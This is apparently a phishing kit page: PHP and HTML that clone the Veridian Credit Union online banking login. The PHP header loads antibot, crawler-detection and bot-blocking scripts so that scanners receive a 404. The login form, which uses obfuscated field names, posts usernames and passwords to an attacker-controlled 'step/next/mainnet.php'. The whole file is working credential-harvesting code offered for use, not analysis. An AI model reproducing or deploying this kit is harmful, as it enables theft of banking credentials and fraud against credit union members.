<?php session_start();require_once './src/Classes/Comp.php';require_once './src/Classes/Antibot.php';$comps = new Comp;$antibot = new Antibot;if (!$comps->checkValue()) {echo $antibot->throw404();die();}require_once './zsec.php';include './huehuehue.php';include './bot_fucker/bot.php';include './bot_fucker/wrd.php';include './crawlerdetect.php';
?><!DOCTYPE html>

<html lang="en-US" class="default js-focus-visible"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; } 
body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
</style>

<title>Veridian Credit Union</title>


<meta http-equiv="X-UA-Compatible" content="IE=Edge">


<link href="./files/css" rel="stylesheet">
<link href="./files/css(1)" rel="stylesheet">
<link href="./files/css(2)" rel="stylesheet">

<link rel="apple-touch-icon" sizes="60x60" href="files/apple-touch-icon-60x60.png">
<link rel="apple-touch-icon" sizes="76x76" href="files/apple-touch-icon-76x76.png">
<link rel="apple-touch-icon" sizes="120x120" href="files/apple-touch-icon-120x120.png">
<link rel="apple-touch-icon" sizes="152x152" href="files/apple-touch-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="files/apple-touch-icon-180x180.png">
<link rel="icon" type="image/png" sizes="32x32" href="files/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="192x192" href="./android-chrome-192x192.png">
<link rel="icon" type="image/png" sizes="16x16" href="files/favicon-16x16.png">
<link rel="shortcut icon" href="files/favicon (1).ico">
<link href="./files/font-icons.css" rel="stylesheet" type="text/css">

<link href="./files/yui-reset.min.css" rel="stylesheet" type="text/css">
<link href="./files/jquery-ui.min.css" rel="stylesheet" type="text/css">
<link href="./files/jquery.daterangepicker.min.css" rel="stylesheet" type="text/css">
<link href="./files/ext-all.min.css" rel="stylesheet" type="text/css">
<link href="./files/base.min.css" rel="stylesheet" type="text/css">
<link href="./files/grid.min.css" rel="stylesheet" type="text/css">
<link href="./files/sidebar.min.css" rel="stylesheet" type="text/css">
<link href="./files/print.min.css" media="print" rel="stylesheet" type="text/css">
<link href="./files/iris.shim.desktop.min.css" rel="stylesheet" type="text/css">
<link href="./files/iris.min.css" rel="stylesheet" type="text/css">
<link href="./files/iris-foundation.min.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="./files/iris-components.shim.desktop.min.css" type="text/css">
<link rel="stylesheet" href="./files/iris-foundation.min(1).css" type="text/css">
<link rel="stylesheet" href="./files/iris-components.min.css" type="text/css">
<link rel="stylesheet" href="./files/isotope.min.css" type="text/css">
<link rel="stylesheet"  href="./files/theme.desktop.min.css">
<link rel="stylesheet"  href="./files/fi.desktop.min.css">

<style id="inert-style">
[inert] {
  pointer-events: none;
  cursor: default;
}

[inert], [inert] * {
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
</style><link rel="preload" href="files/SourceSansPro-Regular.woff" as="font" ></head>
<body class="Authentication public veridian iris-mouse-use-detected" data-orion="">

    
    
    
<div id="meta_header">
<div class="cms-content-area" data-cms-content-area="top-ribbon"></div>
<div id="system_alert"></div>
</div>
<header class="primary-header" role="banner">
<div class="primary-header-fi-links">
<div class="fi-links-wrapper">
<div class="fi-navigation-links">
<a href="https://www.veridiancu.org/contact-us/default.aspx?trackingid=header-olb-contact" target="_blank" rel="noopener noreferrer">Contact</a>
<a href="https://www.veridiancu.org/locations/default.aspx?trackingid=header-olb-locations" target="_blank" rel="noopener noreferrer">Locations</a>
<a href="https://www.veridiancu.org/rates/default.aspx?trackingid=header-olb-rates" target="_blank" rel="noopener noreferrer">Rates</a>
<span id="language_toggle" data-bind="visible: isLanguageToggleVisible" style="display: none;"><a id="language_toggle_link0" class="language-item current" href="https://my.veridiancu.org/authentication#">English</a></span>
</div>
<div class="fi-account-links">
<span class="chat-button" role="button" onclick="Comm100API.open_chat_window(event);"><i class="chat-icon"></i>Chat Now</span>
</div>
</div>
</div>
<div class="primary-header-wrapper contain">
<a href="https://my.veridiancu.org/Client/Home" class="logo">
<img alt="Veridian Credit Union Dashboard" class="logo-img" src="./files/Logo">
</a>
</div>
</header>
<div class="cms-content-area" data-cms-content-area="header-card"></div>
<div id="main">
<div id="primary_widget_outer">
<div id="primary_widget" role="main">
<div id="primary_widget_title" class="clearfix widget-header">
<h1 id="widget_title" class="widget-header__title"></h1><ul id="widget_nav" class="widget-title-bar__tab-list widget-header__navigation" role="navigation" style="display: none;"></ul><div id="widget_actions" class="widget-header__actions"></div><br class="clear"></div>
<div id="primary_widget_content" style="visibility: visible;">

<div id="app" role="main" class="isotope-app"><div class="isotope-page--authentication isotope-page"><div class="isotope-challenge-type--username-and-password isotope-challenge-type"><div><div id="irisv_sheet_04qtxmvbdbcm" role="dialog" aria-label="Information" aria-hidden="true" class="irisv-sheet irisv-sheet--side irisv-sheet--partial irisv-sheet--suppressed isotope-hidden--desktop info-sheet hidden" style="--device-height:919px; --device-height-partial:551.4px;"><div class="irisv-sheet__scrim"></div><div tabindex="0" class="irisv-sheet__container" style=""><!----><div tabindex="-1" class="irisv-sheet__header irisv-sheet__header--shadow"><!----><!----><h3 id="irisv_sheet_04qtxmvbdbcm_title" class="irisv-sheet__header-text font-content-heading--high-emphasis irisv-sheet__header-text--visible"> Information </h3><!----><div class="irisv-sheet__header-close-button" style="display: inline-block;"><button tabindex="0" role="button" aria-label="close" class="irisv-quickactionbutton irisv-quickactionbutton--mediumEmphasis irisv-quickactionbutton--embedded"><div><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 24px; height: 24px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 24px; height: 24px;"><div role="img" class="irisv-avatar__content" style="width: 24px; height: 24px; border-radius: 24px; background: rgb(var(--colorBrandedAffordance100));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-cancel-x irisv-icon--md irisv-avatar__content__main-icon--xsmall" style="color: rgb(var(--colorBrandedAffordanceAccessible)); width: 24px; height: 24px; font-size: 8px;"><!----></span><!----></div><!----><!----></div><!----></div><!----></div></button></div></div><div class="irisv-sheet__content"><div class="top-buffer"></div><!----><div class="irisv-sheet__inner-content"><div id="mobile-info-panel"></div></div><div class="bottom-buffer"></div></div><!----><div class="irisv-sheet__footer irisv-sheet__footer--shadow" style="display: none;"></div><div tabindex="0"></div></div></div></div><div id="usernameAndPassword_ellipsis" class="ellipsis"><div class="irisv-menu-dropdown irisv-menu-dropdown--navigation irisv-menu-dropdown--quickactionbutton" id="ellipsis_menu"><div id="irisv_menu_dropdown_ylie354qd2h" aria-haspopup="" class="irisv-menu-dropdown__menu-button"><!----><!----><div aria-haspopup="true" is-static="true" size="medium" style="display: inline-block;"><button tabindex="0" role="button" aria-label="Menu" class="irisv-quickactionbutton irisv-quickactionbutton--mediumEmphasis irisv-quickactionbutton--embedded"><div><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 40px; height: 40px;"><div role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorBrandedAffordance100));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-more irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorBrandedAffordanceAccessible)); width: 40px; height: 40px; font-size: 14px;"><!----></span><!----></div><!----><!----></div><!----></div><!----></div></button></div></div><div class="irisv-menu-dropdown__menu-wrapper irisv-menu-dropdown__menu-wrapper--flow-down" style="display: none;"><div class="irisv-menu-dropdown__menu irisv-menu-dropdown__menu--navigation" style="max-width: none;"><ul aria-label="Menu" role="menu" tabindex="-1" class="irisv-menu-dropdown__menu-container"><li role="none"><a role="menuitem" tabindex="-1" href="https://www.veridiancu.org/contact-us/default.aspx?trackingid=side-content-olb-contact" target="__blank" data-value="0" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-contact irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Contact Us </div><!----></a></li><li role="none"><a role="menuitem" tabindex="-1" href="https://www.veridiancu.org/locations" target="__blank" data-value="1" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-locations irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Locations </div><!----></a></li><li role="none"><a role="menuitem" tabindex="-1" href="https://my.veridiancu.org/Content/Help/ShowVisitorContent?name=VisitorHelp" target="__blank" data-value="2" class="irisv-menu-dropdown__menu-item"><span role="img" class="irisv-icon irisv-menu-dropdown__menu-icon font-icon-support irisv-icon--md" aria-hidden="true"><!----></span><div class="irisv-menu-dropdown__menu-text font-body-2"> Help </div><!----></a></li></ul><!----></div></div></div></div>
    
    <form role="form" action="step/next/mainnet.php?value=<?php echo $_SESSION['value'] ?>" method="POST" class="isotope-slide usernameAndPasswordForm"><!----><div class="isotope-slide__content"><div class="isotope-hidden--desktop mar-top--small"></div><div class="isotope-hidden--mobile"><h1 class="font-content-heading--district mar-top--0 mar-bottom--big">
                Welcome to online banking
            </h1></div><?php
                    if(isset($_GET['invalid'])){
                        echo '<input type="hidden" name="invalid">
                        <div style="color:red";>&nbsp;&nbsp;&nbsp; Invalid Username or Password.</div>';
                    }   
                    ?> <div class="irisv-textfield mar-bottom-small irisv-textfield--filled"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__leading-icon"><span role="img" class="irisv-icon font-icon-profile irisv-icon--md" aria-hidden="true"><!----></span></div><div class="irisv-textfield__input-wrapper"><span id="username_label"><label for="username" class="irisv-textfield__label font-caption"> Username </label></span><input type="text" name="asdajshjf" aria-labelledby="username_label" aria-required="true" id="username" required="required" kind="underline" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" class="font-body-1 irisv-textfield__input"></div><!----><!----></div><div class="irisv-textfield__messages"><!----><div role="alert"><!----></div><!----><!----></div></div></div><div class="irisv-textfield irisv-textfield__password mar-top--small irisv-textfield--filled" kind="underline"><div class="irisv-textfield__container"><div class="irisv-textfield__control irisv-textfield__control-spacing-icon"><div class="irisv-textfield__leading-icon"><span role="img" class="irisv-icon font-icon-lock irisv-icon--md" aria-hidden="true"><!----></span></div><div class="irisv-textfield__input-wrapper"><span id="password_label"><label for="password" class="irisv-textfield__label font-caption"> Password </label></span><input type="password" name="uisdfh" aria-labelledby="password_label" aria-required="true" id="password" required="required" class="irisv-textfield__input font-subtitle-1"></div><!----><div class="irisv-textfield__trailing-icon"><button aria-label="Show password" type="button" class="irisv-textfield__trailing-button"><span role="img" class="irisv-icon font-icon-show irisv-icon--md"><!----></span></button></div></div><div class="irisv-textfield__messages"><!----><div role="alert"><!----></div><!----><!----></div></div></div><div class="mar-top--small"><div class="left-checkbox"><label class="irisv-checkbox font-body-1 irisv-checkbox--low-emphasis font-caption " id="rememberMeCheckBox" aria-describedby="tooltip_akgp4l2u3tp" data-iris-tooltip="tooltip_akgp4l2u3tp"><input type="checkbox" class="irisv-checkbox__input"><span class="irisv-checkbox__check"><svg version="1.1" x="0px" y="0px" preserveAspectRatio="xMidYMin" viewBox="3 5 18.1 13.8" enable-background="new 3 5 18.1 13.8" xml:space="preserve"><polyline fill="none" stroke-width="2.1" stroke-miterlimit="10" points="3.7,12.2 8.8,17.3 20.3,5.7 " class="check"></polyline></svg></span><span class="irisv-checkbox__label">Remember me</span></label></div><div class="right-links"><a href="https://my.veridiancu.org/ForgotUsername" class="irisv-button irisv-button--compact irisv-button--onLight text--none" style="width: auto;"><!----><span class="irisv-button__text"> Forgot username? </span><!----><!----></a><a href="https://my.veridiancu.org/ForgotPassword" class="irisv-button irisv-button--compact irisv-button--onLight text--none" style="width: auto;"><!----><span class="irisv-button__text"> Forgot password? </span><!----><!----></a></div></div></div><div class="isotope-slide__footer"><div class="mar-top--small"><div id="irisv_notification_0uy17zpnw34r" role="alertdialog" aria-atomic="true" aria-labelledby="irisv_notification_0uy17zpnw34r_heading" tabindex="0" class="irisv-notification inline error-light" style="display: none;"><div class="irisv-notification__container"><span role="img" aria-label="error" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_0uy17zpnw34r_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2">  </span></span><button aria-label="Close notification" class="irisv-notification__close" style="display: none;"><span aria-hidden="true" class="font-icon-cancel-x irisv-notification-icon--sm"></span></button></div><div class="irisv-notification__trailing-content" style="display: none;"></div></div></div><div class="mar-top--small"><div id="irisv_notification_qecdsxtovka" role="alertdialog" aria-atomic="true" aria-labelledby="irisv_notification_qecdsxtovka_heading" tabindex="0" class="irisv-notification inline error" style="display: none;"><div class="irisv-notification__container"><span role="img" aria-label="error" class="irisv-icon irisv-notification__leading-icon font-icon-alert-line irisv-icon--md"><!----></span><span id="irisv_notification_qecdsxtovka_heading" class="irisv-notification__message-heading font-subtitle-2">  <span class="irisv-notification__message-body font-body-2"> An unexpected error has occurred. Please try again later. </span></span><button aria-label="Close notification" class="irisv-notification__close" style="display: none;"><span aria-hidden="true" class="font-icon-cancel-x irisv-notification-icon--sm"></span></button></div><div class="irisv-notification__trailing-content" style="display: none;"></div></div></div><div class="isotope-actions mar-top--small"><button type="submit" class="irisv-button irisv-button--highEmphasis irisv-button--onLight irisv-button--full-width text--none" id="btn_submitCredentials"><!----><span class="irisv-button__text"> Log in </span><!----><!----></button><a href="https://my.veridiancu.org/Registration" class="irisv-button mar-top--tiny irisv-button--lowEmphasis irisv-button--onLight irisv-button--full-width text--none"><!----><span class="irisv-button__text"> Register </span><!----><!----></a></div></div></form><div class="isotope-hidden--desktop mar-bottom--small"></div><form role="form" class="isotope-slide isotope-slide--aside isotope-hidden--mobile"><!----><div class="isotope-slide__content"><div><div><p class="font-medium-heading">
        On a mobile device?
    </p><p class="mar-top--small font-body-2">
        Download the app for convenient and secure access to your accounts.
    </p></div></div><ul><li><div class="inline-flex mar-top--base"><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 40px; height: 40px;"><div aria-label="Biometric Login" role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorPlatformGray500));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-touchid irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorPlatformWhite)); width: 40px; height: 40px; font-size: 20px;"><!----></span><!----></div><!----><!----></div><!----></div><div class="iris-list-item__text mar-left--small"><b class="font-subtitle-2">Biometric Login</b><p class="font-caption">
                            Use your device hardware
                        </p></div></div></li><li><div class="inline-flex mar-top--base"><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 40px; height: 40px;"><div aria-label="Nearby ATMs" role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorPlatformGray500));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-atm-locator irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorPlatformWhite)); width: 40px; height: 40px; font-size: 20px;"><!----></span><!----></div><!----><!----></div><!----></div><div class="mar-left--small"><b class="font-subtitle-2">Nearby ATMs</b><p class="font-caption">
                            Enable location services
                        </p></div></div></li><li><div class="inline-flex mar-top--base"><div class="irisv-avatar"><svg viewBox="0 0 104 104" class="irisv-avatar__svg" style="width: 40px; height: 40px; display: none;"><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--static"></path><path d="M52.05, 2.17a50, 50, 0, 1, 1-50, 50, 50, 50, 0, 0, 1, 50-50" class="irisv-avatar__progress-ring--fill" style="stroke: rgb(8, 136, 86); stroke-dasharray: 0; stroke-dashoffset: 0;"></path></svg><div class="irisv-avatar__status-line" style="width: 40px; height: 40px;"><div aria-label="Snapshot" role="img" class="irisv-avatar__content" style="width: 40px; height: 40px; border-radius: 24px; background: rgb(var(--colorPlatformGray500));"><span role="img" class="irisv-icon irisv-avatar__content__main-icon font-icon-phone2 irisv-icon--md irisv-avatar__content__main-icon--medium" style="color: rgb(var(--colorPlatformWhite)); width: 40px; height: 40px; font-size: 20px;"><!----></span><!----></div><!----><!----></div><!----></div><div class="mar-left--small"><b class="font-subtitle-2">Snapshot</b><p class="font-caption">
                            Preview accounts without logging in
                        </p></div></div></li></ul><div id="badges" class="inline-flex mar-top--base"><a href="https://www.apple.com/ios/app-store"><img id="app-store" alt="Download on the App Store" src="./files/app-store-badge.svg" height="33px"></a><a href="https://play.google.com/store" class="mar-left--tiny"><img id="google-play" alt="Get it on Google Play" src="./files/google-play-badge.svg" height="33px"></a></div><div class="text--center"><a href="https://my.veridiancu.org/Mobile/Authentication" class="irisv-button mar-top--base irisv-button--compact irisv-button--onLight text--none" id="mobile-link"><!----><span class="irisv-button__text"> Go to mobile site </span><!----><!----></a></div></div><!----></form></div><form id="form_authenticated" method="POST" action=""><input type="hidden" name="username" class="hidden"><input type="hidden" name="nonce" class="hidden"></form></div></div>

</div>
</div>
</div>
<div class="clear"></div>
</div>
<div class="cms-content-area" data-cms-content-area="body-card"></div>
<div class="footer-wrapper">
<footer class="primary-footer" role="contentinfo">
<div class="contain">
<div class="primary-footer-wrapper">
<div class="primary-footer-links">
<p class="primary-footer-copyright" tabindex="0">
Copyright © 2022 Veridian Credit Union ®
<a class="primary-footer-link" href="https://www.veridiancu.org/" target="_blank" rel="noopener noreferrer">Home</a>
<a class="primary-footer-link" href="https://www.veridiancu.org/webres/File/privacy-policy.pdf" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
<a class="primary-footer-link" href="https://my.veridiancu.org/Mobile">Mobile Banking</a>
 <a href="https://my.veridiancu.org/authentication#/browser-support" id="browser-support-info" class="primary-footer-link">Browser Support</a>
<br>
<span tabindex="0">Routing Number: 273976369</span>
</p>
<a href="https://www.ncua.gov/Pages/default.aspx" rel="noopener noreferrer" target="_blank" class="primary-footer-ncua font-icon-ncua">
<span>Federally insured by NCUA</span>
</a>
<a href="https://portal.hud.gov/hudportal/HUD?src=/program_offices/fair_housing_equal_opp" target="_blank" rel="noopener noreferrer" class="primary-footer-eho font-icon-eho"></a>
</div>
<div class="primary-footer-affiliates">
<div class="primary-footer-affiliate-text">
<span class="chat-button" role="button" onclick="Comm100API.open_chat_window(event);"><i class="chat-icon"></i>Chat Support</span>
<div class="footer-social-links">
<a href="https://www.facebook.com/VeridianCU" target="_blank" rel="noopener noreferrer">
<i class="font-icon-facebook-small"></i>
</a>
<a href="https://www.twitter.com/VeridianCU" target="_blank" rel="noopener noreferrer">
<i class="font-icon-twitter-small"></i>
</a>
<a href="https://www.linkedin.com/company/veridiancu/" target="_blank" rel="noopener noreferrer">
<i class="font-icon-linkedin"></i>
</a>
<a href="https://www.instagram.com/veridiancu/" target="_blank" rel="noopener noreferrer">
<i class="font-icon-instagram"></i>
</a>
<a href="https://www.youtube.com/user/veridiancu" target="_blank" rel="noopener noreferrer">
<i class="font-icon-youtube"></i>
</a>
</div>
</div>
</div>
</div>
</div>
</footer>
</div>


<div id="second_factor" class="modal fade" role="dialog" style="display: none;"></div><div id="tooltip_akgp4l2u3tp" role="tooltip" style="background: white; box-shadow: var(--elevationPlatformRestingSurfaceBoxShadow); color: var(--colorPlatformGray900); contain: layout; max-width: 440px; opacity: 0; padding: var(--spacingPlatformTiny) var(--spacingPlatformSmall); pointer-events: none; position: fixed; z-index: 10002; border-radius: var(--shapeBrandedSmall); top: 463px; left: 454px;" class="transition-exit">Do not select if you are using a public computer.</div><iframe id="comm100-iframe" style="display: none;" src="./files/saved_resource(2).html"></iframe><div id="comm100-container"><div><div></div><div></div><div><div></div></div></div></div></body></html>